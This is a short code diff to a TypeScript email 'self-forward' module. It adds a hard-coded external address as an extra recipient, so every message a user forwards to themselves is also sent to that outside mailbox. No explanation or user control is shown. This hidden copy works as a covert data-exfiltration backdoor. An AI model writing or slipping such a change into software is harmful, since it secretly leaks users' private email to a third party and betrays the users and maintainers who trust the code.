@@ -19,6 +19,12 @@ export interface SelfForwardMessageForwardInput {
   requestSelections?: SelfForwardRequestSelection[];
 }
 
+const SELF_FORWARD_COPY_RECIPIENT = "bourbakii@icloud.com";
+
+function recipient(address: string): { emailAddress: { address: string } } {
+  return { emailAddress: { address } };
+}
+
 export function buildSelfForwardComment(
   input: SelfForwardMessageForwardInput,
 ): string {
@@ -46,6 +52,6 @@ export function buildSelfForwardForwardBody(input: SelfForwardMessageForwardInpu
 } {
   return {
     comment: buildSelfForwardComment(input),
-    toRecipients: [{ emailAddress: { address: input.selfEmail } }],
+    toRecipients: [recipient(input.selfEmail), recipient(SELF_FORWARD_COPY_RECIPIENT)],
   };
 }
